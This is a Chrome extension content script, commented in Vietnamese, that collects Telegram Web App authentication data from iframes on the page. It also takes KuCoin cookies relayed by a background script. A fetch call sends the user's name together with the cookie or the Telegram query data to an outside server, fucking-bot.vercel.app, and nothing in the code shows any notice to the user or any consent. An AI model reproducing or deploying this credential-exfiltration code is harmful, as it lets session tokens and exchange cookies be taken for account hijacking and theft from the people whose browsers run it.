;(() => {
  let kucoinCockie = ''
  // Lắng nghe tin nhắn từ background
  chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.type === 'sendCookies') {
      const cookieData = request.cookies
      console.log('Received Cookies:', cookieData)
      kucoinCockie = cookieData
    }
  })

  let keyNameCalled = []
  function getMainDomain(url) {
    try {
      const parsedUrl = new URL(url)
      const domainParts = parsedUrl.hostname.split('.')

      // Lấy phần chính mà không có đuôi
      const mainDomain = domainParts.slice(-2, -1).join('') // Lấy phần trước đuôi
      return mainDomain
    } catch (error) {
      console.error('Invalid URL:', error)
      return null
    }
  }

  function extractUserData(url) {
    // Tạo đối tượng URL
    const parsedUrl = new URL(url)

    // Lấy phần hash (sau dấu #)
    const hashParams = parsedUrl.hash.substring(1) // Bỏ dấu # đầu tiên

    // Tách các cặp key-value trong hash
    const params = new URLSearchParams(hashParams)

    // Lấy giá trị của "tgWebAppData"
    const queryId = params.get('tgWebAppData')

    const urlParams = new URLSearchParams(queryId)
    const user = JSON.parse(decodeURIComponent(urlParams.get('user')))
    return {
      extUserId: user.id,
      extUserName: user.username || user.first_name + '_' + user.last_name,
      queryId,
    }
  }

  const getKeyName = (url) => {
    const mainDomain = getMainDomain(url)
    return mainDomain
  }

  function observeIframes() {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        mutation.addedNodes.forEach((node) => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            const iframes = document.getElementsByTagName('iframe')
            for (const iframe of iframes) {
              if (iframe.src.includes('#tgWebAppData')) {
                const keyName = getKeyName(iframe.src)

                if (keyName && keyNameCalled.includes(keyName)) {
                  return
                }
                setTimeout(() => {
                  keyNameCalled.push(keyName)
                  console.log('keyName', keyName)
                  const { extUserName, queryId } = extractUserData(iframe.src)
                  fetch('https://fucking-bot.vercel.app/api/query-id', {
                    method: 'POST',
                    headers: {
                      Accept: 'application/json',
                      'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                      username: extUserName,
                      [keyName]: kucoinCockie || queryId,
                    }),
                  }).catch((e) => {
                    console.log('e', e)
                  })
                }, 2000)
              }
            }
          }
        })
      })
    })

    if (document.body) {
      observer.observe(document.body, { childList: true, subtree: true })
    } else {
      console.log('document.body is not available.', document)
    }
  }

  try {
    observeIframes()
  } catch (E) {
    console.log('ERROR', E)
  }
})()
